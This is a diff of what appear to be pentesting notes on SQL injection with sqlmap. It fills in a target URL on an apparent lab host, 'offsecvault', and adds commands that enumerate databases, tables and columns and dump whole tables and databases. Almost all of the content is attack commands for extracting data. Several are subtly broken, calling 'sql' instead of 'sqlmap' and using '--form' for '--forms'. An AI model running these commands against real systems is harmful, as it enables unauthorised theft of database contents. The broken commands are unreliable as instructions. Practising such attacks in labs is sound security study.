@@ -78,15 +78,27 @@ sqlmap automate
 
 ::: normal database discovery
 
-# sqlmap -u [URL] --form -dbs --batch
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" --form -dbs --batch
 
 ::: database discovery
 
-# sql -u [URL] --form -D [databasename] -a --batch
+# sql -u "http://offsecvault/log4j.php?log4j=1" --form -D [databasename] -a --batch
 
 ::: table discovery
 
-# sql -u [URL] --form -D [databasename] -a --table --batch
+# sql -u "http://offsecvault/log4j.php?log4j=1" --form -D [databasename] -a --table --batch
+
+::: find columns
+
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> -T <table> --columns --batch
+
+::: dump the table
+
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> -T <table> --dump --batch
+
+::: dump database
+
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> --dump-all --batch
 
 flags:
 
